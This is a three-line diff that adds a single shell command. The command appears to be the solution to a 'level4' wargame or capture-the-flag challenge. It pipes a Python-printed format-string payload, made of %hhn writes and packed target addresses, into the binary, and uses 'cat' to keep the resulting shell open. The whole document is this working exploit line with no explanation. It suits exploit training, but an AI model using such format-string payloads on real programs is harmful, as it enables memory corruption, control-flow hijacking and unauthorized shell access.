@@ -1,0 +1,3 @@
+
+(python -c 'print "A%41$hhnA" + "%42$hhn" + "A"*66 + "%43$hhn" + "A"*17 + "%44$hhn" +
+"AAA\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08"' ; cat) | ./level4
